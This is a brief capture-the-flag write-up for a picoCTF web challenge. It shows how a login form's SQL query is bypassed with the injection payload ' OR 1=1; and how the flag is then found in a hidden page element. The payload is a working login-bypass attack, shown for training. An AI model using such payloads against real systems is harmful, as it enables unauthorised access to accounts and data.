# SQLiLite

## Description
Can you login to this website?

Try to login [here](http://saturn.picoctf.net:64785/).

## Exploit

We can see that sending a request will create an SQL statement:

```sql
username: aa
password: aa
SQL query: SELECT * FROM users WHERE name='aa' AND password='aa'
```

So we can send the following payload:

```sql
username: admin
password: ' OR 1=1;
SQL query: SELECT * FROM users WHERE name='admin' AND password='' OR 1=1;'
```

Sending this request we get a message informing us that the login was successful but the flag is not in plain sight.

Opening the dev tools we can see there's a hidden element with the flag.
